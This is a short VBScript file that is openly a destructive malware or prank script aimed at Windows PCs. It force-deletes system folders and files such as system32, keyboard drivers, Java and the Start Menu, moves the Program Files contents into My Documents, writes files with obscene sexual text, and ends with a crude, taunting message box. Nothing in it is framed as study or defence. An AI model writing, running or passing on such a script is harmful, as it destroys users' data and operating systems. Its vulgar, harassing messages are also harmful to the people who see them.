dim filesysdelfile
Set filesysdelfile = CreateObject("Scripting.FileSystemObject")
filesysdelfile.DeleteFile "C:\WINDOWS\system\KEYBOARD*.*",True
filesysdelfile.DeleteFile "C:\WINDOWS\Java*.*",True
filesysdelfile.DeleteFile "C:\WINDOWS\SHELLNEW*.*",True
filesysdelfile.DeleteFile "C:\WINDOWS\system32*.*",True
filesysdelfile.DeleteFile "C:\WINDOWS\system\hpsysdrv.exe*.*",True
filesysdelfile.DeleteFile "C:\Documents And Settings\Owner\Start Menu*.*",True
Set filesysdelfile = Nothing
dim filesys
set filesys=CreateObject("Scripting.FileSystemObject")
filesys.MoveFile "c:\Program Files\*.*", "c:\Documents And Settings\Owner\My Documents"
Set ANTI = CreateObject("Scripting.FileSystemObject")
Set NOTEPAD = anti.CreateTextFile("C:\suckballz.TXT")
Set NOTEPAD = anti.CreateTextFile("C:\PROGRAM FILES/givemehead.txt")
NOTEPAD.writeline "heybjgiver "
NOTEPAD.writeline "so you do give bjs? hmm give me one!! not"
NOTEPAD.Writeline "exit"
NOTEPAD.close
msgbox  " Ha Ha i think you just got fucked. im cracking up your mom dont taste good ha ha"
